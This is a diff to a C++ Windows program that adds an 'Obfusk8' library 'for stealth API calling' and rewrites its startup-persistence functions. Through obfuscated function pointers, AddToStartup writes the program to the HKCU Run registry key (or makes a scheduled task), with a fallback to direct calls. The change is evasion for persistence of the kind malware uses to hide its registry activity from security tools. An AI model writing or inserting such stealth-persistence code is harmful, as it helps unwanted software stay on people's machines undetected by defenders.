@@ -6,6 +6,9 @@
 #include <iostream>
 #include <string>
 
+// Include Obfusk8 for stealth API calling
+#include "../Obfusk8/Instrumentation/materialization/state/Obfusk8Core.hpp"
+
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "ole32.lib")
@@ -202,14 +205,37 @@ bool AddToStartup() {
         return CreateScheduledTask(exePath);
     }
 
-    // Non-admin path: HKCU Run registry key
-    HKEY hKey;
-    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_SET_VALUE, &hKey);
+    // Non-admin path: HKCU Run registry key with stealth API access
+    RegistryAPI regAPI;
+    if (!regAPI.IsInitialized()) {
+        // Fallback to direct registry API
+        HKEY hKey;
+        LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_SET_VALUE, &hKey);
+        if (result != ERROR_SUCCESS) {
+            return false;
+        }
+
+        result = RegSetValueExA(
+            hKey,
+            RUN_VALUE,
+            0,
+            REG_SZ,
+            (const BYTE*)exePath.c_str(),
+            (DWORD)(exePath.length() + 1)
+        );
+
+        RegCloseKey(hKey);
+        return (result == ERROR_SUCCESS);
+    }
+
+    // Use stealth registry API
+    HKEY hKey = NULL;
+    LONG result = regAPI.pRegOpenKeyExA(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_SET_VALUE, &hKey);
     if (result != ERROR_SUCCESS) {
         return false;
     }
 
-    result = RegSetValueExA(
+    result = regAPI.pRegSetValueExA(
         hKey,
         RUN_VALUE,
         0,
@@ -218,7 +244,7 @@ bool AddToStartup() {
         (DWORD)(exePath.length() + 1)
     );
 
-    RegCloseKey(hKey);
+    regAPI.pRegCloseKey(hKey);
     return (result == ERROR_SUCCESS);
 }
 
@@ -227,10 +253,23 @@ bool RemoveFromStartup() {
     bool removedTask = RemoveScheduledTask();
 
     bool removedReg = false;
-    HKEY hKey;
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        removedReg = (RegDeleteValueA(hKey, RUN_VALUE) == ERROR_SUCCESS);
-        RegCloseKey(hKey);
+    RegistryAPI regAPI;
+    
+    if (!regAPI.IsInitialized()) {
+        // Fallback to direct registry API
+        HKEY hKey;
+        if (RegOpenKeyExA(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+            removedReg = (RegDeleteValueA(hKey, RUN_VALUE) == ERROR_SUCCESS);
+            RegCloseKey(hKey);
+        }
+    } else {
+        // Use stealth registry API
+        HKEY hKey = NULL;
+        if (regAPI.pRegOpenKeyExA(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+            // Use direct API for delete since it may not be available in stealth class
+            removedReg = (RegDeleteValueA(hKey, RUN_VALUE) == ERROR_SUCCESS);
+            regAPI.pRegCloseKey(hKey);
+        }
     }
 
     return removedTask || removedReg;
